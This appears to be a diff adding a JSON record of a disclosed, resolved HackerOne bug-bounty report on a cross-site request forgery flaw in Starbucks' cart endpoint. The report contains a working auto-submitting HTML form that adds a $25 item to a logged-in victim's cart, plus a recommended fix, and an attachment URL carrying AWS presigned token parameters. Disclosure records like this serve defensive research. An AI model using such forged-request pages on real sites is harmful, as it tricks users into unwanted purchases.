@@ -1,0 +1,126 @@
+{
+  "id": 177472,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzc0NzI=",
+  "url": "https://hackerone.com/reports/177472",
+  "title": "CSRF: add item to victim's cart automatically (starbucks.com - updatecart)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2016-10-22T02:18:59.203Z",
+  "submitted_at": "2016-10-22T02:18:59.203Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bughuntermate",
+    "url": "/bughuntermate",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/078/089/cf2d9ccc8e17928108969cbc19cd4bd629821065_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1989,
+    "url": "https://hackerone.com/starbucks",
+    "handle": "starbucks",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Starbucks",
+      "twitter_handle": "Starbucks",
+      "website": "http://www.starbucks.com",
+      "about": "Premier purveyor of the finest coffee in the world, inspiring and nurturing the human spirit — one person, one cup and one neighborhood at a time."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-06-02T16:30:07.653Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-06-02T16:17:20.580Z",
+  "team_member_agreed_on_going_public_at": "2017-06-02T16:30:07.595Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "\nSteps:\n    1. Victim login their starbucks account first.\n    2. Attacker send a form/link to victim.\n    3. If victim click the form/link, An item would automatically add to victim's cart.\n    4. If victim do not find this item, he/she would pay for this item which can greatly influence your repuation.\n\nAttached is the form.\n\n\n<html>\n  <body>\n    <form action=\"https://www.starbucks.com/shop/updatecart\" method=\"POST\">\n      <input type=\"hidden\" name=\"card&#95;custom&#95;image&#95;id\" value=\"\" />\n      <input type=\"hidden\" name=\"card&#95;custom&#95;theme\" value=\"\" />\n      <input type=\"hidden\" name=\"card&#95;id\" value=\"db126c2c&#45;277c&#45;4208&#45;9ade&#45;e3014ba16722\" />\n      <input type=\"hidden\" name=\"card&#95;quantity\" value=\"1\" />\n      <input type=\"hidden\" name=\"defined&#95;amount\" value=\"25\" />\n      <input type=\"hidden\" name=\"defined&#95;currency\" value=\"USD\" />\n      <input type=\"hidden\" name=\"greeting&#95;card\" value=\"8779a801&#45;11e4&#45;463e&#45;bcbd&#45;8e8f7b4608ac\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n\nSolution:\n    Add a CSRF-token to the post form.",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 129556,
+      "file_name": "starbuckcsrf.html",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/129/556/b792b83ce652d137ba1479e172d054424392067a/starbuckcsrf.html?response-content-disposition=attachment%3B%20filename%3D%22starbuckcsrf.html%22%3B%20filename%2A%3DUTF-8%27%27starbuckcsrf.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUMDKYUIJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T220428Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCTBZ4h%2BEHBZSFfDHS5xw2lelyK3qXpIz0clJB%2BHBqcowIgGBBqxDbz0xnRKDGsVdESXdSniE%2BHBfV1rdO5eUFQnIwqsgUIGxADGgwwMTM2MTkyNzQ4NDkiDHxzkXQ%2BPax8qe0y9SqPBWkQfzyqj92jaUMU%2B5T6SPQ2kSj%2B59Aoadiw1gfHO1i4%2F0ccMTamoXifGiV3xIRAODWeznHuiZo5MFXs0eRE%2FeWKjui%2F%2FMMnnlP75Mx9RcCfX%2BAHTArOR285KOGZDt%2BZPNVnbkP2qBeLN0V6EMy9txjtwWdscus8dc%2FXgJhwDuj97m1BB9yGA3zN4LtWfNdFYbEczDLKRtZbzn1L4jODhFct25OSTftIczlOFeJpTNqo%2BerkSz1Ylt639JDBZAFG%2B%2F384F4y%2B3gW5MdI3fDFInGbZ6WQfrkWqAzqhHutrBUVNUAn%2FDqibJus5zz%2BVp%2BsRoO%2B7h7HWfMQQm7jTsgIsWUWfi5Xn0NW2RnXmmOyBV2i1w7RYPGh839tEAdmiEtNzRDGGDc1rXcvP%2Fnu0D4i535aNIsTVSYLWOXW1bkgSZr1%2BaWjQBOwB54d3ClcXzG8reuvJrc8leF4O5JWigxlkPT3RPzRKssEcfc8y8h0KIVRJUWqDiV16S%2FAzsyOlRAnBcw3QDVEV0Y18f8afe%2Br%2BH8V3inuEV0LwetfWCzmPI9EESVCpcy5jx0d%2FWQzGZMcKsiMd5iASh3In9hajQdjSBkjfKQQvdRTlMP8Rj509%2BVnpyqb8KfFCPpqZlxHq8w5hG7Jvh9JrqWnpnm33jxQeuCcE2l%2BO24C3DBFJzwdyKcMjfzW3EwoHrGT4Cc%2BPtsBeR9o3RkFcsPJnQe9lziaCDt4NcQx1THGqGSDv9RpUERKgDO2Grm2jmKot2zviBn%2FwgbBFPNaUyddeC%2BZ0saisluhOUGwj6f58TSWNmfQYEtDoMv31WIyx1LKCEv6%2FX6tfB3UZ6aL2E00tjrZeUw1tFdLTE1BKzL89eez2RcC9Tsw6v7AxgY6sQFRvZZktkF3WxdZ8vz5Fj5gKPwlIiZFUYyAsVF6aratdHjahABxDIpxl97ZWekaITd7DSQ5d6%2FjBbWSgz0HFU%2BQ12GVJrjW6E4LpVh8S%2Fr3p630NbeLs3%2FBQImwQmEOReIK9LFwI03BoYMjztPBX1hyMKznO0if%2FDqx9LlvfJwqhzk78xiZ1SGiQO1LPDxXUebXgOUKYHqNtfArYl0Mr8XgXTWDcrCtLVbnHyKjoGD%2FT9k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4e6167a98aa117171e3e05f106a9e6b63642947eb67683ce5ff6203bb0fc1de3",
+      "file_size": 832,
+      "type": "text/html",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-07-02T16:17:20.657Z",
+  "allow_singular_disclosure_after": -259480027.95840517,
+  "singular_disclosure_allowed": true,
+  "vote_count": 12,
+  "voters": [
+    "shubham_srt",
+    "eveeez",
+    "pr0f0x01",
+    "bughuntermate",
+    "japz",
+    "wragg-s",
+    "spetr0x",
+    "sahore",
+    "dynamo214_",
+    "razahasnain979",
+    "and 2 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
